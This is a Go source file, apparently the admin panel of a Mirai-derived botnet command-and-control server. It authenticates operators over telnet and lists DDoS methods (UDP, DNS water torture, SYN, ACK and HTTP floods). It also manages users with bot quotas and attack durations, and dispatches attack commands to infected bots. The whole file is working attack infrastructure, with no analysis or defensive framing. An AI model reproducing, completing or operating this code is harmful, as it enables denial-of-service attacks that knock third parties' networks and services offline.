package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
    "io/ioutil"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

defer func() {
	this.conn.Write([]byte("\033[?1049l"))
	}()
	message, err := ioutil.ReadFile("message.txt")
	if err != nil {
		return
	}

	prom := string(message)

	// Get username
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[01;37mYou better fuck off.\033[01;31m \r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[0;36mUsername\033[\033[01;37m: \033[01;37m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[0;36mPassword\033[\033[01;37m: \033[01;37m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[01;37mChecking...\033[01;37m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(200) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[01;90mTry again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	// Header
	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [%d] Bloods <-|-> Connected as: %s\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[0;37mWhat's up \033[1;34m" + username + "\033[0;37m? \r\n"))
	this.conn.Write([]byte(fmt.Sprintf("\033[0;36mMessage from admin: \033[0;37m%s\r\n", prom)))
    this.conn.Write([]byte("\r\n"))

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[1;34m\033[0;36m" + username + "\033[1;34m@\033[0;36mmirai\033[01;37m\033[01;37m:\033[01;37m \033[01;37m"))
		cmd, err := this.ReadLine(false)

		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}

		if err != nil || cmd == "c" || cmd == "cls" || cmd == "clear" { // clear screen
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;34m                     $$$$$$$$$$$$$$$$$$$$$$$                     \r\n"))
			this.conn.Write([]byte("\033[1;34m                    $$$$___$$$$$$$$$$$$$$$$$$$$$                 \r\n"))
			this.conn.Write([]byte("\033[1;34m                  $$$$______$$$$$$$$$$$$$$$$$$$$$$               \r\n"))
			this.conn.Write([]byte("\033[1;34m                $$$$$________$$$$$$$$$$$$$$$$$$$$$$$             \r\n"))
			this.conn.Write([]byte("\033[1;34m               $$$$$__________$$$$$$$$$$$$$$$$$$$$$$$            \r\n"))
			this.conn.Write([]byte("\033[1;34m              $$$$$____________$$$$$$$$$$$$$$$$$$$$$$$           \r\n"))
			this.conn.Write([]byte("\033[1;34m             $$$$$$____________$$$$$$$$$$$$$$$$$$$$$$$$          \r\n"))
			this.conn.Write([]byte("\033[1;34m             $$$$$$___________$$$$$$$$$___________$$$$$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m             $$…$$$$$_________$$$_$$$_$$$_________$$$$$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m             $$$$$$$$______$$$$___$___$$$$______$$$$$$$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m             $$$$$$$$$$$$$$$$$___$$$___$$$$$$$$$$$$$$$$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m             $$$_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_o$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m             $$$__$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__$$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m              $$$__$’$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__o$$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m              ’$$o__$$__$$’$$$$$$$$$$$$$$’$$__$$_____o$$         \r\n"))
			this.conn.Write([]byte("\033[1;34m                $$o$____$$__’$$’$$’$$’__$$______$___o$$          \r\n"))
			this.conn.Write([]byte("\033[1;34m                 $$$o$__$____$$___$$___$$_____$$__o$             \r\n"))
			this.conn.Write([]byte("\033[1;34m                  ’$$$$O$____$$____$$___$$ ____o$$$              \r\n"))
			this.conn.Write([]byte("\033[1;34m                     ’$$o$$___$$___$$___$$___o$$$                \r\n"))
			this.conn.Write([]byte("\033[1;34m                       ’$$$$o$o$o$o$o$o$o$o$$$$                  \r\n"))					 		   
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;90mMessage from admin: \033[0;36m%s\r\n", prom)))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if err != nil || cmd == "methods" || cmd == "METHODS" {
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;34m!stdhex\033[97m:\033[0;36m STD Hex Flood (UDP)\r\n"))
			this.conn.Write([]byte("\033[1;34m!plain\033[97m:\033[0;36m UDP flood optimized for higher PPS\r\n"))
			this.conn.Write([]byte("\033[1;34m!udp\033[97m:\033[0;36m Standart UDP flood\r\n"))
			this.conn.Write([]byte("\033[1;34m!dns\033[97m:\033[0;36m DNS water torture (UDP)\r\n"))
			this.conn.Write([]byte("\033[1;34m!ovh\033[97m:\033[0;36m OVH hex flood (UDP)\r\n"))

			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;34m!syn\033[97m:\033[0;36m TCP SYN flood\r\n"))
			this.conn.Write([]byte("\033[1;34m!ack\033[97m:\033[0;36m TCP ACK flood\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;34m!http\033[97m:\033[0;36m Layer7 customized flood\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if err != nil || cmd == "opts" || cmd == "options" {
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[0;36m methods \033[97mcommand will show you all of attack types\033[97m\033[0;36m\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31m\033[0;36m If you want to check options of an attack method\r\n"))
			this.conn.Write([]byte("\033[31m\033[97m Example command:\033[0;36m !udp 1.1.1.1 20 ?\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if err != nil || cmd == "MENU" || cmd == "menu" {
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;34mmethods\033[97m:\033[0;36m shows attack methods\r\n"))
			this.conn.Write([]byte("\033[1;34mblock / unblock \033[97m:\033[0;36m block or unblock attacks to ip range\r\n"))
			this.conn.Write([]byte("\033[1;34mbots\033[97m:\033[0;36m shows botcount and bot architectures\r\n"))

			this.conn.Write([]byte("\033[1;34maddadmin\033[97m:\033[0;36m add an admin\r\n"))
			this.conn.Write([]byte("\033[1;34maddbasic\033[97m:\033[0;36m add an user\r\n"))
			this.conn.Write([]byte("\033[1;34mremoveuser\033[97m:\033[0;36m remove an user\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}


		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte("\033[0mPut the IP (next prompt will be asking for prefix):\033[01;37m "))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPut the Netmask (after slash):\033[01;37m "))
			new_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mWe are going to block all attacks attempts to this ip range: \033[97m" + new_pr + "/" + new_nm + "\r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr, new_nm) {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mSuccessful!\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte("\033[0mPut the prefix that you want to remove from whitelist: \033[01;37m"))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPut the netmask that you want to remove from whitelist (after slash):\033[01;37m "))
			rm_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mWe are going to unblock all attacks attempts to this ip range: \033[97m" + rm_pr + "/" + rm_nm + "\r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove that ip range\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mSuccessful!\r\n"))
			}
			continue
		}		

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}

			this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}

			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}

			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}

			if confirm != "y" {
				continue
			}

			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}

			continue
		}

		if cmd == "bots" || cmd == "BOTS" {
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36%s: \x1b[01;37m%d\033[0m\r\n\033[0m", k, v)))
			}

			this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal Bots: \033[01;37m[\033[0;36m%d\033[01;37m]\r\n\033[0m", botCount)))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var YotCount int
					if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
						YotCount = userInfo.maxBots
					} else {
						YotCount = clientList.Count()
					}
					this.conn.Write([]byte(fmt.Sprintf("\033[0;36mAttack has been started with \033[1;34m%d \033[0;36mbots\r\n", YotCount)))
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\033[0;36mThis address is whitelisted by our botnet which means you can't attack none of ip's in this range.\033[0;31m\r\n")))
					fmt.Println("" + username + " tried to attack on one of whitelisted ip ranges")
				}
			}
		}
	}
}




func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {

		if bufPos > 1023 { //credits to Insite <3
			fmt.Printf("Sup?")
			return "", *new(error)
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
